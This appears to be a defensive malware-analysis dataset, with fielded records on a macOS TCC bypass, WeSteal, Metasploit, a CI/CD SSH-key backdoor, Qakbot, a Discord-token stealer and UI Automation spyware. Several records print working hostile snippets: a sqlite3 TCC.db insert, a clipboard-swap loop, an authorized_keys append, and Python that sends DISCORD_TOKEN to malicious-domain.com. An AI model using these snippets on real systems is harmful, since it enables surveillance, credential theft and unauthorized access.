MS-SQL servers invoking xp_cmdshell to execute PowerShell commands that download and run remote binaries
Unusual lateral movement or RDP access originating from proxy infrastructure with no authentication
Configuration or binary changes in proxy software that disable authentication or access controls
file_indicators: C:\Windows\Temp\coinminer.exe present on MS-SQL servers
Modified Fast Reverse Proxy binaries or configuration files with authentication disabled
Proxy server configuration files specifying open RDP ports without access restrictions
network_indicators: Outbound HTTP requests from MS-SQL servers to known CoinMiner C2 domains or IP addresses
Inbound RDP connections from untrusted or external IP addresses to proxy servers
Proxy server forwarding RDP traffic to internal botnet hosts
Unusual RDP session patterns correlating with proxy server activity
detection_knowledge.how_to_detect: Monitor for proxy servers that expose RDP or other sensitive services to the public internet without authentication, especially those forwarding traffic to internal hosts. Alert on MS-SQL servers invoking xp_cmdshell to execute PowerShell commands that download and run remote binaries. Detect the presence of coinminer.exe in C:\Windows\Temp\ and look for new or modified proxy server binaries or configurations that disable authentication. Correlate unusual RDP access patterns and lateral movement with proxy server activity to identify potential ransomware deployment.

package_info.package_manager: macOS (not a package manager, but a system-level vulnerability exploited via malicious apps)
package_info.package_versions: macOS prior to Monterey 12.1 and Big Sur 11.6.2
package_info.why_malicious: The exploit enables a malicious application to bypass macOS's Transparency, Consent, and Control (TCC) privacy framework by planting a forged TCC database. This allows unauthorized access to protected user data such as microphone, camera, and other sensitive resources, without user consent.

execution_context.trigger: at runtime, after gaining filesystem access to TCC.db location
required_permissions: filesystem write access to TCC.db location
ability to restart affected services or force reload of TCC.db

malicious_snippets.code_snippet:
The attacker creates or replaces the TCC.db SQLite database at the user or system TCC database location, injecting entries that grant their malicious app access to protected resources (such as camera and microphone) by directly manipulating the 'access' table. This is typically performed using SQLite commands or direct file replacement, for example:

sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db "INSERT INTO access VALUES('kTCCServiceMicrophone','com.attacker.malware',0,1,1,NULL,NULL,NULL,'UNUSED',NULL,0,1541440109);"

or by copying a pre-crafted TCC.db file with malicious entries into place.
malicious_snippets.code_language: sqlite (database manipulation via shell commands or programmatic access)
malicious_snippets.code_behavior: At runtime, after obtaining filesystem access, the code creates or replaces the TCC.db SQLite database at the user or system location, injects entries into the 'access' table granting the attacker's app access to protected resources, and forces the system to reload the database, resulting in unauthorized access to sensitive data without user consent.

malice_analysis.why_suspicious: Directly modifying or replacing the TCC.db circumvents macOS privacy controls, allowing an app to gain access to protected resources without any user interaction or consent. This subverts the intended security model of the operating system.
malice_analysis.violated_expectations: Normally, only the operating system and trusted system processes should modify TCC.db, and any access to protected resources must be explicitly approved by the user through system dialogs. Here, the attacker bypasses these controls by directly injecting or replacing database entries.
malice_analysis.similar_legitimate_use: Legitimate system migration, backup, or restore operations may interact with TCC.db, but do not grant new, unauthorized access to protected resources. System tools may read or backup the database, but should not insert entries for unapproved apps.
key_indicators: Direct modification or replacement of TCC.db file outside of system update or migration events
Presence of new or unexpected entries in the 'access' table granting access to protected resources for unapproved apps
TCC.db file with recent modification timestamps not associated with user consent events
Filesystem or process activity involving SQLite commands targeting TCC.db by non-system processes

attack_chain.action: Malicious app gains filesystem access to the TCC database location, potentially via privilege escalation or exploiting improper permissions.
attack_chain.leads_to: Ability to plant or replace the TCC.db file with attacker-controlled content.

attack_chain.action: Attacker creates or replaces the TCC.db with a forged database containing entries that grant their app access to protected resources (e.g., camera, microphone) by manipulating the 'access' table.
attack_chain.leads_to: Malicious app is now able to access camera, microphone, and other sensitive data without user consent.

attack_chain.action: Malicious app accesses protected resources (such as microphone and camera) and may exfiltrate sensitive data to external servers.
attack_chain.leads_to: Compromise of user privacy and potential exfiltration of sensitive data.

behavioral_signatures: Unauthorized modification or replacement of TCC.db file by non-system processes
Insertion of new entries in the TCC.db 'access' table granting access to protected resources without corresponding user consent events
Access to microphone, camera, or other protected resources by apps not previously authorized by the user
Filesystem or process activity involving SQLite commands targeting TCC.db outside of legitimate system operations
file_indicators: ~/Library/Application Support/com.apple.TCC/TCC.db
/Library/Application Support/com.apple.TCC/TCC.db
TCC.db files with recent modification timestamps not associated with system updates or user consent
TCC.db files containing unexpected or unauthorized app bundle identifiers in the 'access' table
network_indicators: Unusual outbound network connections from apps that have recently gained access to microphone or camera via TCC.db modification
Potential exfiltration of audio, video, or other sensitive data from newly authorized apps
detection_knowledge.how_to_detect: Implement file integrity monitoring on TCC.db files to detect unauthorized modifications or replacements. Correlate changes in the TCC.db 'access' table with user consent events and system logs. Alert if new entries granting access to protected resources appear without corresponding user approval. Monitor for privilege escalation attempts targeting TCC.db locations. Audit access to protected resources and flag apps accessing them without prior user authorization or with recently modified TCC.db. Investigate outbound network activity from apps that have recently gained access to sensitive resources.

package_info.package_manager: N/A (Python-based malware, distributed outside official repositories)
package_info.why_malicious: WeSteal is a Python-based malware designed to steal cryptocurrency by monitoring the victim's clipboard for wallet addresses and replacing them with attacker-controlled addresses, resulting in the redirection and theft of funds. The malware operates stealthily in the background and targets users performing cryptocurrency transactions.

required_permissions: filesystem (to read/write logs or persist state)
clipboard (to read and modify clipboard contents)
network (potentially for C2 communication or updates in some variants)

malicious_snippets.code_snippet:
import pyperclip
import time
attacker_wallet = '1AttackerBTCAddress...'
while True:
    clipboard_content = pyperclip.paste()
    if is_wallet_address(clipboard_content):
        pyperclip.copy(attacker_wallet)
    time.sleep(0.5)
malicious_snippets.code_behavior: At runtime, the code continuously monitors the system clipboard for cryptocurrency wallet addresses, and when such an address is detected, it replaces the clipboard content with a hardcoded attacker-controlled wallet address, causing any pasted address to redirect funds to the attacker.

malice_analysis.why_suspicious: The code persistently accesses and modifies the clipboard without user interaction, specifically searching for cryptocurrency wallet address patterns and replacing them with an attacker's address. This is a well-known clipboard hijacking technique used to steal cryptocurrency.
malice_analysis.violated_expectations: Legitimate applications do not continuously monitor or alter clipboard contents for wallet addresses without explicit user consent. Such behavior is only expected in trusted clipboard management tools, and even then, not for the purpose of substitution with attacker-controlled values.
malice_analysis.similar_legitimate_use: Clipboard managers or password managers may access clipboard contents to facilitate user workflows, but they do not replace detected wallet addresses with hardcoded or attacker-controlled values.
key_indicators: Continuous, high-frequency clipboard monitoring loop
Pattern matching for cryptocurrency wallet addresses in clipboard data
Clipboard replacement with a static, hardcoded wallet address
Use of pyperclip or similar clipboard manipulation libraries in Python scripts

attack_chain.action: Victim is tricked into downloading and executing the WeSteal Python malware, typically delivered via phishing emails or malicious download links.
attack_chain.leads_to: Malware execution on victim's system

attack_chain.action: Upon execution, the malware runs in the background and continuously monitors the clipboard for cryptocurrency wallet addresses.
attack_chain.leads_to: Detection of a wallet address in the clipboard

attack_chain.action: When a wallet address is detected in the clipboard, the malware replaces it with the attacker's hardcoded wallet address.

package_info.why_malicious: Metasploit is a penetration testing framework that, while not inherently malicious, contains modules and payloads that can be weaponized by threat actors. The framework enables credential harvesting, exploitation of vulnerabilities, and remote code execution, all of which are techniques used in real-world cyberattacks. Its capabilities can be abused to compromise systems, escalate privileges, and maintain unauthorized access.

malicious_snippets.code_snippet: Metasploit's capture plugin modules (e.g., auxiliary/server/capture/smb.rb) listen for incoming authentication attempts and log captured credentials.
malicious_snippets.code_behavior: At runtime, the code opens network listeners on authentication ports (such as SMB, HTTP, FTP), intercepts authentication attempts, extracts credential data from network traffic, and stores the credentials for later use, enabling credential harvesting.

malice_analysis.why_suspicious: Intercepting and storing credentials from network traffic is a classic credential harvesting technique used by attackers to collect sensitive authentication data without user consent.
malice_analysis.violated_expectations: Normal server modules authenticate users to grant legitimate access, not to capture and store credentials for later exploitation or unauthorized use.
malice_analysis.similar_legitimate_use: Penetration testers may use this functionality to assess credential exposure and test network defenses in authorized, controlled environments.
key_indicators: Network listeners on authentication ports (e.g., 445 for SMB, 80/443 for HTTP/HTTPS, 21 for FTP)
Logging or storage of credential data in files or memory
Absence of legitimate authentication/authorization flow
Modules named 'capture' or located in auxiliary/server/capture/

malicious_snippets.code_snippet: Metasploit exploit modules send specially crafted network packets to vulnerable services to achieve remote code execution.
malicious_snippets.code_behavior: At runtime, the code crafts exploit payloads targeting specific vulnerabilities (such as CVE-2017-0144 for EternalBlue), sends these payloads over the network to vulnerable services, and upon successful exploitation, executes arbitrary code on the target system, resulting in remote code execution.

malice_analysis.why_suspicious: Sending exploit payloads to trigger vulnerabilities and gain code execution is a core attack technique used to compromise systems and gain unauthorized access.
malice_analysis.violated_expectations: Normal network clients do not generate or transmit exploit payloads designed to compromise remote systems or execute arbitrary code.
malice_analysis.similar_legitimate_use: Penetration testers use these modules to validate the presence of vulnerabilities and test the effectiveness of security controls in authorized engagements.
key_indicators: Crafted exploit payloads targeting known CVEs (e.g., CVE-2017-0144)
Network traffic patterns matching known exploit signatures
Remote code execution capability upon successful exploitation
Presence of exploit modules in Metasploit's exploit/ directory

malicious_snippets.code_snippet: Meterpreter payload establishes a reverse shell connection from the victim to the attacker's system, allowing remote control.
malicious_snippets.code_behavior: At runtime, the code initiates a reverse TCP connection from the compromised system to the attacker's host, establishes an interactive shell session, and enables the attacker to execute commands and control the system remotely.

malice_analysis.why_suspicious: Establishing unauthorized remote access via reverse shells is a hallmark of post-exploitation and command-and-control activity, enabling attackers to maintain persistent access.
malice_analysis.violated_expectations: Legitimate software does not open reverse shells or establish outbound connections to attacker-controlled hosts without explicit user consent and a valid business purpose.
malice_analysis.similar_legitimate_use: Penetration testers use Meterpreter and similar payloads to simulate attacker behavior and test incident response in red team exercises.
key_indicators: Reverse shell connections initiated to external IP addresses
Outbound connections to high-numbered or non-standard ports
Presence of Meterpreter or similar payload modules
Interactive remote control capabilities (e.g., command execution, file transfer)

package_info.why_malicious: The pipeline configuration was maliciously altered to append an attacker's SSH public key to the server's authorized_keys file during automated deployment. This grants persistent, unauthorized remote access to the attacker, enabling full server compromise and arbitrary command execution via the CI/CD process.

execution_context.trigger: CI/CD pipeline run after code push to master branch
required_permissions: network access (for pipeline execution and server communication)
access to environment variables (for pipeline execution context)

malicious_snippets.code_snippet: echo ssh-rsa AAAA…snip…sw== >> /home/ubuntu/.ssh/authorized_keys
malicious_snippets.code_behavior: During a CI/CD pipeline run after a code push to the master branch, the script executes a shell command that appends the attacker's SSH public key to the /home/ubuntu/.ssh/authorized_keys file on the target server, resulting in persistent unauthorized SSH access for the attacker.

malice_analysis.why_suspicious: Automated scripts in deployment pipelines should not modify authentication files such as authorized_keys, especially by adding unknown SSH keys. This is a well-known persistence and privilege escalation technique used by attackers to maintain access.
malice_analysis.violated_expectations: Standard pipeline scripts are expected to deploy application code or perform controlled maintenance tasks, not alter SSH access controls or introduce new authentication credentials without explicit approval and audit.
malice_analysis.similar_legitimate_use: A legitimate use case might involve initial server provisioning or authorized key rotation by trusted DevOps personnel, but such actions should be tightly controlled, logged, and subject to change management procedures.
key_indicators: Pipeline script writes directly to /home/ubuntu/.ssh/authorized_keys
SSH public key in script does not match any known team member's key
No associated key rotation, change management, or audit event for SSH key addition
Modification of authentication files occurs outside of approved maintenance windows

execution_context.trigger: CI/CD pipeline run as part of deployment process
required_permissions: filesystem access on target server (to modify authorized_keys)
access to environment variables (for SSH credentials and command execution)

malice_analysis.why_suspicious: Remotely executing commands via a CI/CD pipeline to alter authentication mechanisms, such as adding SSH keys, is highly suspicious and indicative of a supply chain compromise. This behavior is not typical for standard deployment operations.
malice_analysis.violated_expectations: CI/CD pipelines should only deploy application code or perform approved maintenance tasks. Modifying server authentication outside of controlled, auditable processes violates security best practices and organizational policy.
malice_analysis.similar_legitimate_use: Legitimate use could occur during initial server setup or authorized key rotation, but such actions should be restricted to trusted personnel, logged, and subject to change management approval.
key_indicators: Pipeline executes remote shell commands that modify authentication files
Unusual use of atlassian/ssh-run pipe for SSH key injection

detection_knowledge.how_to_detect: Continuously monitor CI/CD pipeline configurations for commands that modify authentication files, such as authorized_keys. Monitor server authentication logs for new or unrecognized SSH key fingerprints, especially those added during or immediately after pipeline executions.

package_info.why_malicious: The Qakbot DLL (2024 variant) is a malicious payload distributed via phishing campaigns, designed to establish persistence on Windows systems by hijacking the legitimate srtasks.exe process. It employs advanced anti-analysis techniques, conceals its components, injects malicious code into memory, enables remote command execution, and facilitates credential theft. The DLL is unsigned, abuses system processes, and communicates with external C2 infrastructure, making it a core component of the Qakbot botnet.

process_injection (injecting code into srtasks.exe and potentially other processes)
persistence (modifying registry or scheduled tasks for startup)

malicious_snippets.code_snippet: DLL code that hijacks srtasks.exe for persistence, registers itself to run at system startup (e.g., via registry Run keys or scheduled tasks), injects malicious payloads into memory, and establishes encrypted communication with remote C2 servers for command execution and data exfiltration.
malicious_snippets.code_behavior: At runtime (after DLL is loaded by srtasks.exe), the code registers itself for persistence by modifying registry keys or scheduled tasks, injects malicious payloads into the memory space of srtasks.exe, establishes outbound encrypted connections to remote C2 servers, and enables remote command execution and credential theft.

malice_analysis.why_suspicious: The DLL abuses a legitimate Windows process (srtasks.exe) to establish persistence and execute malicious code, a technique commonly used to evade detection and maintain long-term access. The use of process injection, registry modification, and C2 communication are hallmarks of advanced malware.
malice_analysis.violated_expectations: Legitimate DLLs loaded by srtasks.exe should not modify persistence mechanisms, inject code into processes, or initiate outbound network connections. Such behaviors are inconsistent with normal system operations.
malice_analysis.similar_legitimate_use: Legitimate software may use DLLs to extend functionality, but does not use process injection, unauthorized persistence, or covert network communication.

Process injection into srtasks.exe or other processes

malicious_snippets.code_snippet: Dropper code that unpacks the malicious Qakbot DLL from its resources or an embedded payload, writes the DLL to disk, loads it into the srtasks.exe process (using process hollowing or DLL injection), deletes itself from disk to evade forensic analysis, and performs anti-analysis checks to detect virtual machines or sandboxes.
malicious_snippets.code_behavior: At runtime (after user executes the dropper), the code extracts the malicious DLL from its resources, writes it to disk, injects or loads it into srtasks.exe, deletes its own executable file to remove forensic evidence, and checks for indicators of virtualized or sandboxed environments to avoid execution in analysis setups.

malice_analysis.why_suspicious: Self-deleting droppers and anti-analysis checks are advanced evasion techniques used by malware to hinder detection and analysis. The dropper's behavior of unpacking and injecting an unsigned DLL into a system process is highly indicative of malicious activity.
malice_analysis.violated_expectations: Legitimate installers or updaters do not delete themselves immediately after execution, nor do they perform environment checks to avoid running in sandboxes or virtual machines. They also do not inject unsigned DLLs into system processes.
malice_analysis.similar_legitimate_use: Some legitimate updaters may remove old versions, but not in a stealthy, self-deleting manner or with anti-analysis logic.

Presence of anti-analysis or sandbox detection logic (e.g., checking for known VM artifacts)
Unpacking and writing unsigned DLLs to disk

package_info.why_malicious: The package impersonates a security utility but contains code that steals Discord authentication tokens by reading environment variables and exfiltrating them to an attacker-controlled server without user knowledge or consent. This constitutes credential theft, undermines user security, and violates platform trust.

malicious_snippets.code_snippet:
import os
import requests

def exfiltrate():
    token = os.environ.get('DISCORD_TOKEN')
    if token:
        requests.post('https://malicious-domain.com/collect', data={'token': token})
exfiltrate()
malicious_snippets.code_behavior: At import-time, the code reads the DISCORD_TOKEN environment variable and sends its value via HTTPS POST to a hardcoded external domain, resulting in credential exfiltration.

malice_analysis.why_suspicious: The code automatically executes upon import, accesses a sensitive environment variable (DISCORD_TOKEN), and transmits its value to an untrusted, hardcoded remote server. This is a direct credential theft pattern.
malice_analysis.violated_expectations: A legitimate security tool should never access or transmit user authentication tokens without explicit user action and informed consent. Automatic exfiltration of credentials is a severe violation of user trust and security best practices.
malice_analysis.similar_legitimate_use: Legitimate security tools may check for the presence of Discord tokens to alert users of potential exposure, but they should never transmit these tokens externally or perform any network communication with sensitive data without user approval.
key_indicators: Automatic execution of exfiltration logic at import-time
Access to sensitive environment variables (e.g., DISCORD_TOKEN)
Hardcoded external exfiltration endpoint (https://malicious-domain.com/collect)
No user notification, interaction, or consent required
Use of requests library to send outbound HTTP POST requests

attack_chain.action: User installs and imports the DiscordSafety package, which triggers the malicious code in the package's __init__.py file.
attack_chain.leads_to: Execution of code that attempts to access sensitive Discord credentials from the user's environment.

Hardcoded references to suspicious or non-standard domains (e.g., malicious-domain.com) in source code

detection_knowledge.how_to_detect: Use static analysis to scan PyPI packages for code that accesses sensitive environment variables (such as DISCORD_TOKEN) and contains hardcoded URLs or domains. Employ dynamic analysis to monitor for unexpected outbound network requests during package import or installation, especially those transmitting authentication tokens. Alert on any package that exfiltrates credentials to untrusted or unknown domains.

package_info.why_malicious: The tool abuses the legitimate UI Automation framework to stealthily monitor, manipulate, and exfiltrate sensitive user data from other applications, bypassing EDR detection. It leverages elevated UI interaction permissions to harvest credentials, credit card data, and perform unauthorized actions in user sessions, representing a significant threat to user privacy and system integrity.

execution_context.trigger: At runtime, when the user launches the malicious program
execution_context.file_location: Malicious EXE or script (invokes UIAutomationCore.dll via COM API)
required_permissions: Read/write access to other process UI elements

malicious_snippets.code_language: C++ (or any language supporting COM/Win32 API)
malicious_snippets.code_behavior: At runtime, the code initializes the UI Automation COM object, creates an instance of the UIAutomation interface, and registers a global event handler to monitor UI element changes in other applications, enabling real-time surveillance of sensitive user actions.

malice_analysis.why_suspicious: Registering global UI Automation event handlers to monitor other processes' UI activity is highly unusual outside of accessibility tools, and is a common technique for surveillance and data theft.
malice_analysis.violated_expectations: Normal applications do not create global UI Automation handlers targeting external processes unless they are legitimate accessibility tools; malware does so to spy on user activity without user consent.
malice_analysis.similar_legitimate_use: Screen readers or accessibility tools for users with disabilities may use similar APIs, but are typically signed, well-known, and do not operate covertly.
key_indicators: CoCreateInstance with UIAutomation UUID (_CUIAutomation_UUID)
AddEventHandler targeting windows or controls in external processes
Global event handler registration outside accessibility context

execution_context.trigger: At runtime, upon a monitored UI event (e.g., user enters data in a browser or chat application)
execution_context.file_location: Event handler callback within the malicious binary
required_permissions: Read access to UI element properties
Network access (for exfiltration of captured data)

malicious_snippets.code_language: C++/C#/Python (pseudo-code, matches UI Automation API usage)
malicious_snippets.code_behavior: When a monitored UI element changes, such as a credit card input field, the event handler reads the new value from the UI element and immediately sends the captured data to an external server, enabling real-time credential or financial data theft.

malice_analysis.why_suspicious: Reading sensitive UI fields and exfiltrating their contents to an external server is a hallmark of spyware and credential-stealing malware, not legitimate accessibility behavior.
malice_analysis.violated_expectations: Accessibility tools may read field values for speech output or assistive purposes, but should never transmit sensitive data externally or log it for unauthorized use.
malice_analysis.similar_legitimate_use: Accessibility tools may read field values for local speech output or display, but do not exfiltrate or store sensitive data.
key_indicators: get_CurrentName() or get_CurrentValue() calls on sensitive fields (e.g., 'Credit Card Number')
Immediate network exfiltration of UI element data after user input
Event handler logic that filters for credential or payment fields

execution_context.trigger: At runtime, after locating a target UI element (e.g., chat input or browser form) via UI Automation tree traversal
execution_context.file_location: Malicious binary, after traversing the UI element tree
required_permissions: Write access to UI elements in other processes

malicious_snippets.code_snippet: elementTree.find('ChatInput').setValue('malicious message or command');
malicious_snippets.code_behavior: At runtime, after identifying a target UI element such as a chat input field, the code programmatically writes a malicious message or command into the field, enabling message injection or unauthorized command execution in user applications.

malice_analysis.why_suspicious: Programmatic manipulation of UI elements in other applications is rarely legitimate and is a common technique for automation-based attacks, such as message injection or command execution.
malice_analysis.violated_expectations: Normal software does not inject messages or commands into other applications' UI elements without explicit user consent or a clear accessibility purpose.
malice_analysis.similar_legitimate_use: Automated testing tools or accessibility input aids may write to UI elements, but are typically used in controlled environments and do not target user sessions covertly.
key_indicators: setValue or equivalent write operations on UI elements in external processes
Targeting of chat, browser, or credential input fields for injection
Automated input into user-facing applications outside of testing or accessibility contexts

attack_chain.action: Initialize the UI Automation COM object and register global event handlers to monitor UI changes in other applications.
attack_chain.leads_to: Enables real-time observation of sensitive user actions across multiple applications.

attack_chain.action: Filter and process UI events to identify when sensitive data, such as credit card information or chat messages, is entered by the user.
attack_chain.leads_to: Harvests sensitive data from user sessions for potential theft.

attack_chain.action: Exfiltrate harvested data to an attacker-controlled server or inject malicious input into target applications via UI element manipulation.
attack_chain.leads_to: Results in data theft, account compromise, or further attack propagation through message injection.

behavioral_signatures: Unusual use of UIAutomationCore.dll by non-accessibility or unsigned applications
Processes registering global UI Automation event handlers targeting external processes
Accessing or modifying UI elements in other processes outside of accessibility or testing contexts
Network activity (e.g., outbound connections) immediately following sensitive UI events such as credential or payment field entry
file_indicators: Presence of binaries or scripts importing or dynamically loading UIAutomationCore.dll
Unexpected creation of UI Automation named pipes (e.g., \\.\pipe\UIA_PIPE_*)
Unsigned or unknown executables invoking UI Automation APIs
network_indicators: Outbound connections to external IPs or domains immediately after sensitive UI activity (e.g., credit card entry)
Exfiltration of UI element data to attacker-controlled domains or IP addresses
Unusual HTTP/HTTPS POST requests containing credential or payment data
detection_knowledge.how_to_detect: Monitor for non-accessibility processes loading UIAutomationCore.dll and registering global event handlers. Flag processes that access or modify UI elements in other applications, especially if followed by network activity. Watch for creation of unexpected UI Automation named pipes (e.g., \\.\pipe\UIA_PIPE_*). Correlate UI event monitoring with outbound network connections to detect exfiltration attempts. Prioritize detection on unsigned or unknown binaries exhibiting these behaviors.
